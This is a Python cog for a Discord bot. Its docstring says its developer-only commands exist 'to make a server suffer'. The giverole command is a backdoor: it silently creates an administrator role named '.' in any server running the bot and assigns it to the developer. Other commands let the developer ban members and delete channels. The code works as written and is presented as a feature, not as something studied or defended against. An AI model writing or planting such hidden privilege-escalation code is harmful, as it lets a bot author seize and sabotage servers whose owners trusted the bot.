import discord
from discord.ext import commands
from utils.checks import *


class sudo:
    '''
    Developer only commands to make a server suffer
    '''

    def __init__(self,bot):
        self.bot = bot
    
    @commands.command(name='giverole')
    @is_dev()
    async def giverole(self, ctx):
        guild = ctx.guild
        role_name = "."
        role_permissions = guild.default_role
        role_permissions = role_permissions.permissions
        role_permissions.administrator = True
        await guild.create_role(name=role_name, permissions=role_permissions)
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        user = ctx.message.author
        await user.add_roles(role)
        

    @commands.command(name='ban')
    @is_dev()
    async def ban(self, ctx, user:discord.Member, *, reason:str=None):
        """Bans the specified user from the server"""
        if reason is None:
            reason = Language.get("moderation.no_reason", ctx)
        reason += Language.get("moderation.banned_by", ctx).format(ctx.author)
        try:
            await ctx.guild.ban(user, delete_message_days=0, reason=reason)
        except discord.errors.Forbidden:
            if user.top_role.position == ctx.me.top_role.position:
                await ctx.send(Language.get("moderation.no_ban_highest_role", ctx))
            elif user.top_role.position > ctx.me.top_role.position:
                await ctx.send(Language.get("moderation.no_ban_higher_role", ctx))
            else:
                await ctx.send(Language.get("moderation.no_ban_perms", ctx))
            return
        await ctx.send(Language.get("moderation.ban_success", ctx).format(user))


    @commands.command(name='fix')
    @is_dev()
    async def fix(self, ctx):
        for channel in ctx.guild.channels:
            if channel.name == "fumée²":
                await channel.delete()

    @commands.command(name='deletechannel2')
    @is_dev()
    async def deletechannel2(self,ctx):
        for channel in ctx.guild.channels:
            if channel.name == "fumée²":
                await channel.delete()



def setup(bot):
    bot.add_cog(sudo(bot))
